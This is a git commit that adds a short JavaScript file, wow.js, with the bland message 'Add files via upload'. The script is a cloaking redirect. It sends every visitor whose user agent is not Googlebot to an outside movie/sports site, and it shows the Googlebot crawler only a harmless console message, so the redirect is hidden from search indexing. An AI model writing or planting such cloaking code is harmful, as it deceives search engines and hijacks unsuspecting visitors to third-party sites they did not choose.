2cd8b56d2ede8fdaa37c010cb3e5332859f9407d
khannn12 <toufikalahekhan@gmail.com>
2026-09-24 17:19:12 +0600

    Add files via upload

---
+++ wow.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "https://sports24.online/all-movies/paradise/tou";
+} else {
+  console.log("Thanks for visiting my page" );
+}
